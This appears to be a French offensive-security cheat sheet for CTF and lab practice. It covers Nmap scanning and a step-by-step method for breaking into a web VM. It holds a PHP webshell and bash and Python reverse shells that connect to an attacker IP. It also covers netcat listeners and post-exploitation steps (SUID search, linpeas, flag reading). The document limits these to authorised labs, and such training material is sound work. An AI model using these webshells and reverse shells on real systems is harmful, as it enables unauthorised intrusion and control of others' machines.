# 🛰️ Cheat Sheet — Réseau / Nmap & Entrée dans une VM web

Reconnaissance réseau avec Nmap et méthodologie complète pour compromettre une machine web (CTF / lab autorisé).

---

## 1. Nmap — commandes essentielles

```bash
# Découverte d'hôtes (quelles machines sont up ?)
nmap -sn 10.10.10.0/24

# Scan rapide des ports courants
nmap 10.10.10.10

# Tous les ports TCP, rapide
nmap -p- --min-rate 5000 10.10.10.10

# Détection de version + scripts par défaut (le scan « de base » CTF)
nmap -sC -sV 10.10.10.10

# Combo complet sur les ports trouvés
nmap -p 22,80,443 -sC -sV -oN nmap_full.txt 10.10.10.10

# Agressif (OS, version, scripts, traceroute)
nmap -A 10.10.10.10

# UDP (lent — se limiter aux ports clés)
nmap -sU --top-ports 50 10.10.10.10

# Scripts NSE ciblés
nmap -p 80 --script http-enum 10.10.10.10
nmap -p 80 --script http-title,http-headers 10.10.10.10
nmap --script vuln 10.10.10.10
```

### Options utiles

```bash
-sS            # SYN scan (furtif, nécessite root)
-sV            # Version des services
-sC            # Scripts NSE par défaut
-O             # Détection d'OS
-p-            # Tous les ports (1-65535)
--min-rate N   # Accélérer (paquets/s)
-T4            # Timing agressif
-oN fichier    # Sortie lisible
-oA base       # Sortie dans les 3 formats (.nmap/.gnmap/.xml)
-Pn            # Ne pas pinger (cible qui bloque l'ICMP)
```

### Workflow nmap type

```bash
# 1) Tous les ports, vite
nmap -p- --min-rate 5000 -oN ports.txt 10.10.10.10
# 2) Version + scripts sur les ports ouverts trouvés
nmap -p 22,80 -sC -sV -oN detail.txt 10.10.10.10
```

---

## 2. Étapes pour entrer dans une VM web

### Étape 1 — Reconnaissance réseau
```bash
nmap -sn 10.10.10.0/24                 # Trouver l'IP de la cible
nmap -p- --min-rate 5000 10.10.10.10   # Tous les ports
nmap -p <ports> -sC -sV 10.10.10.10    # Détail des services
```
On note les ports web (80, 443, 8080, 8000…).

### Étape 2 — Résolution de nom (si besoin)
Si un service renvoie un nom d'hôte (ex. `cible.htb`) :
```bash
echo "10.10.10.10 cible.htb" | sudo tee -a /etc/hosts
```

### Étape 3 — Énumération web
```bash
whatweb http://10.10.10.10
nikto -h http://10.10.10.10
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/FUZZ -e .php,.txt,.bak
curl -s http://10.10.10.10/robots.txt
```
→ Voir **web.md** pour le détail (vhosts, paramètres, bypass d'en-têtes).

### Étape 4 — Identifier la faille d'entrée
Pistes classiques :
- CMS connu (WordPress, Joomla…) → `wpscan --url http://10.10.10.10 --enumerate u,p`
- Upload de fichier non filtré → uploader un webshell.
- LFI/RFI → inclusion de fichier, log poisoning.
- SQLi → `sqlmap`.
- Identifiants par défaut sur un panneau d'admin.

### Étape 5 — Obtenir l'exécution de code (RCE / webshell)

Webshell PHP minimal (si upload PHP possible) :
```php
<?php system($_GET['c']); ?>
```
```bash
curl -s "http://10.10.10.10/uploads/shell.php?c=id"
```

### Étape 6 — Reverse shell (shell interactif)

Écouteur côté attaquant :
```bash
nc -lvnp 4444
```
Déclenchement via le webshell (`c=` URL-encodé) :
```bash
# bash
bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
# ou busybox / python selon ce qui est dispo
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

### Étape 7 — Stabiliser le shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z puis :
stty raw -echo; fg
```

### Étape 8 — Énumération locale (user flag)
```bash
id ; whoami ; hostname
sudo -l                          # Droits sudo
cat /home/*/user.txt
find / -perm -4000 2>/dev/null   # Binaires SUID
ss -tlnp                         # Services en écoute locale
```

### Étape 9 — Élévation de privilèges (root flag)
```bash
# Automatiser l'énumération
./linpeas.sh

# Pistes GTFOBins selon sudo -l / SUID trouvés : https://gtfobins.github.io
cat /root/root.txt
```

---

## 3. Résumé express

| Phase | Outil | But |
|-------|-------|-----|
| Scan réseau | `nmap -p- -sC -sV` | Ports & services |
| Énum web | `ffuf`, `whatweb`, `nikto` | Points d'entrée |
| Exploitation | `sqlmap`, upload, LFI | Exécution de code |
| Accès | `nc`, reverse shell | Shell interactif |
| Post-exploit | `sudo -l`, `linpeas`, GTFOBins | user puis root |

> ⚠️ À n'utiliser que sur des machines que tu es **explicitement autorisé** à attaquer (CTF, lab perso, HackTheBox, TryHackMe…).